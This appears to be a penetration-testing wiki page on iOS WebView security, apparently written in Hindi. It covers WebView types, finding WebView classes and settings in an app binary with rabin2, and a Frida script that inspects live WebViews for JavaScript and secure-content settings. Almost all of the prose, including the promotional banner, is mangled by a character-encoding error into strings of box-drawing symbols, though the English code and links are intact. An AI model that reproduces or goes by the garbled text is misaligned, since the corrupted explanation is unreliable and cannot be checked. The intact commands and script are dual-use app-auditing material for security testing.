# iOS WebViews

<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## WebViews рдХреЗ рдкреНрд░рдХрд╛рд░

WebViews рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ **рд╡реЗрдм** **рдХрдВрдЯреЗрдВрдЯ** рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдРрдк рдХреЗ рдЕрдВрджрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЙрдореНрдкреЛрдиреЗрдВрдЯреНрд╕ рд╣реИрдВред рд╡реЗ рдРрдк рдХреЗ рдпреВрдЬрд░ рдЗрдВрдЯрд░рдлреЗрд╕ рдореЗрдВ рд╕реАрдзреЗ рд╡реЗрдм рдХрдВрдЯреЗрдВрдЯ рдХреЛ рдПрдореНрдмреЗрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред iOS WebViews **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ** **JavaScript** рдХрд╛ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди **рд╕рдкреЛрд░реНрдЯ рдХрд░рддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдФрд░ Cross-Site Scripting рд╣рдорд▓реЗ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebView рдХреЛ iOS 12 рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ deprecated рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред **JavaScript рдХреЛ рдбрд┐рд╕реЗрдмрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**ред
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): рдпрд╣ рдРрдк рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ, рджрд┐рдЦрд╛рдП рдЧрдП рдХрдВрдЯреЗрдВрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдЪрд┐рдд рд╡рд┐рдХрд▓реНрдк рд╣реИред
* **JavaScript** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди `WKWebView` рдХреА **`javaScriptEnabled`** рдкреНрд░реЙрдкрд░реНрдЯреА рдХреА рдмрджреМрд▓рдд, рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдбрд┐рд╕реЗрдмрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рд╕рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рджреЛрд╖реЛрдВ рдХреЛ рд░реЛрдХрддреЗ рд╣реБрдПред
* **`JavaScriptCanOpenWindowsAutomatically`** рдХрд╛ рдЙрдкрдпреЛрдЧ JavaScript рдХреЛ **рдирдИ рд╡рд┐рдВрдбреЛрдЬ рдЦреЛрд▓рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдкреЙрдк-рдЕрдкреНрд╕ред
* **`hasOnlySecureContent`** рдкреНрд░реЙрдкрд░реНрдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ WebView рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрди рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рд╣реИрдВред
* `WKWebView` рдЖрдЙрдЯ-рдСрдл-рдкреНрд░реЛрд╕реЗрд╕ рд░реЗрдВрдбрд░рд┐рдВрдЧ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдореЗрдореЛрд░реА рдХрд░рдкреНрд╢рди рдмрдЧреНрд╕ рдореБрдЦреНрдп рдРрдк рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ**ред
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рд╛рдорд╛рдиреНрдпреАрдХреГрдд рд╡реЗрдм рджреЗрдЦрдиреЗ рдХреЗ рдЕрдиреБрднрд╡** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрди WebViews рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд▓реЗрдЖрдЙрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрддреНрд╡ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ:

* рдПрдХ рд░реАрдб-рдУрдирд▓реА рдПрдбреНрд░реЗрд╕ рдлреАрд▓реНрдб рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЗрдВрдбрд┐рдХреЗрдЯрд░ рд╣реЛрддрд╛ рд╣реИред
* рдПрдХ рдПрдХреНрд╢рди ("**Share**") **рдмрдЯрди**ред
* рдПрдХ **Done рдмрдЯрди**, рдкреАрдЫреЗ рдФрд░ рдЖрдЧреЗ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдмрдЯрди, рдФрд░ рдПрдХ "Safari" рдмрдЯрди рдЬреЛ рдкреЗрдЬ рдХреЛ рд╕реАрдзреЗ Safari рдореЗрдВ рдЦреЛрд▓рддрд╛ рд╣реИред

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* `SFSafariViewController` рдореЗрдВ **JavaScript рдХреЛ рдбрд┐рд╕реЗрдмрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдФрд░ рдпрд╣реА рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЬрдм рдРрдк рдХреЗ рдпреВрдЬрд░ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд╣реЛрддрд╛ рд╣реИ рддреЛ `WKWebView` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред
* `SFSafariViewController` рднреА **Safari** рдХреЗ рд╕рд╛рде рдХреБрдХреАрдЬрд╝ рдФрд░ рдЕрдиреНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдбреЗрдЯрд╛ **рд╢реЗрдпрд░ рдХрд░рддрд╛ рд╣реИ**ред
* рдПрдХ `SFSafariViewController` рдХреЗ рд╕рд╛рде рдпреВрдЬрд░ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрд╢рди **рдРрдк рдХреЛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреЗ**, рдЬреЛ AutoFill рдбреЗрдЯрд╛, рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рд╣рд┐рд╕реНрдЯреНрд░реА, рдпрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддрд╛ред
* App Store Review Guidelines рдХреЗ рдЕрдиреБрд╕рд╛рд░, `SFSafariViewController`s рдХреЛ **рдЕрдиреНрдп рд╡реНрдпреВрдЬ рдпрд╛ рд▓реЗрдпрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЫрд┐рдкрд╛рдпрд╛ рдпрд╛ рдЕрд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**ред

## WebViews рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЦреЛрдЬ

### рд╕реНрдЯреИрдЯрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдЖрдк рдЗрди WebView рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЗ рдЬреНрдЮрд╛рдд рддрд░реАрдХреЛрдВ рдХреА рдЦреЛрдЬ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, WKWebView рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рд╡рд┐рдзрд┐ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### JavaScript рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛

`WKWebView`s рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреЗрд╣рддрд░реАрди рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХреЗ рд░реВрдк рдореЗрдВ, JavaScript рдХреЛ рддрдм рддрдХ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдХрд┐ рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЖрд╡рд╢реНрдпрдХ рди рд╣реЛред рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ JavaScript рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ `WKPreferences` рдХреЗ рдЙрдкрдпреЛрдЧреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) рдкреНрд░реЙрдкрд░реНрдЯреА `false` рдкрд░ рд╕реЗрдЯ рд╣реИ:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
рдпрджрд┐ рдХреЗрд╡рд▓ рд╕рдВрдХрд▓рд┐рдд рдмрд╛рдЗрдирд░реА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдЗрд╕рдореЗрдВ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### рдХреЗрд╡рд▓ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдкрд░реАрдХреНрд╖рдг

`UIWebView`s рдХреЗ рд╡рд┐рдкрд░реАрдд, `WKWebView`s рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп [рдорд┐рд╢реНрд░рд┐рдд рд╕рд╛рдордЧреНрд░реА](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (HTTPS рдкреГрд╖реНрда рд╕реЗ рд▓реЛрдб рдХреА рдЧрдИ HTTP рд╕рд╛рдордЧреНрд░реА) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent) рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреГрд╖реНрда рдкрд░ рд╕рднреА рд╕рдВрд╕рд╛рдзрди рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЛрдб рдХрд┐рдП рдЧрдП рд╣реИрдВред\
рд╕рдВрдХрд▓рд┐рдд рдмрд╛рдЗрдирд░реА рдореЗрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
рдЖрдк рд╕реНрд░реЛрдд рдХреЛрдб рдпрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдореЗрдВ "http://" рд╢рдмреНрдж рдХреА рдЦреЛрдЬ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХрд╛ рдпрд╣ рдЕрд░реНрде рдирд╣реАрдВ рд╣реИ рдХрд┐ рдорд┐рдХреНрд╕реНрдб рдХрдВрдЯреЗрдВрдЯ рдХреА рд╕рдорд╕реНрдпрд╛ рд╣реИред рдорд┐рдХреНрд╕реНрдб рдХрдВрдЯреЗрдВрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ [MDN рд╡реЗрдм рдбреЙрдХреНрд╕](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content) рдореЗрдВред

### рдбрд╛рдпрдирд╛рдорд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

`ObjC.choose()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реАрдк рдХрд╛ рдирд┐рд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ WebViews рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рдвреВрдВрдврд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рд╕рд╛рде рд╣реА `javaScriptEnabled` рдФрд░ `hasonlysecurecontent` рдЧреБрдгреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛ рд╕рдХреЗ:

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
рдЗрд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ:
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИрдВрдбрд▓рд┐рдВрдЧ

рдХрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдХреАрдореНрд╕ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ рдЬреЛ iOS рдкрд░ WebView рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* http(s)://
* file://
* tel://

WebViews рдПрдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рджреВрд░рд╕реНрде рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡реЗ рдРрдк рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рд╕реНрдерд╛рдиреАрдп рд╕рд╛рдордЧреНрд░реА рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╕реНрдерд╛рдиреАрдп рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдпрд╛ рдкрде рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

### WebView рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб

* **UIWebView**: рдпрд╣ рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрд░рд╛рдиреА рдкрджреНрдзрддрд┐рдпреЛрдВ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) рдпрд╛ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **WKWebView**: рдпрд╣ рд╕реНрдерд╛рдиреАрдп HTML рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) рдпрд╛ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдХреЗ рд▓рд┐рдП `loadRequest:`ред рдЖрдорддреМрд░ рдкрд░, рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЗрдВ [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) рдпрд╛ [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init) рд╕рд╣рд┐рдд рдЕрдиреНрдп рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд╕рдВрдпреЛрдЬрди рдореЗрдВ рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдкрдХреЛ рдпрд╣ рднреА рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдРрдк [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc) рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд╣рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ `URL` рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ WebView рдореЗрдВ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ URL рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рджреВрд╕рд░рд╛ рдкреИрд░рд╛рдореАрдЯрд░ `allowingReadAccessToURL` рдПрдХ рдПрдХрд▓ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЗрд╕рдореЗрдВ рдПрдХ рдПрдХрд▓ рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ рд╡рд╣ рдлрд╝рд╛рдЗрд▓ WebView рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрдЧреАред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ рдЙрд╕ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ WebView рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдХрд░рд╛рдИ рдЬрд╛рдПрдВрдЧреА**ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдФрд░ рдпрджрд┐ рдпрд╣ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдирд╛ рдХрд┐ рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдирд╣реАрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

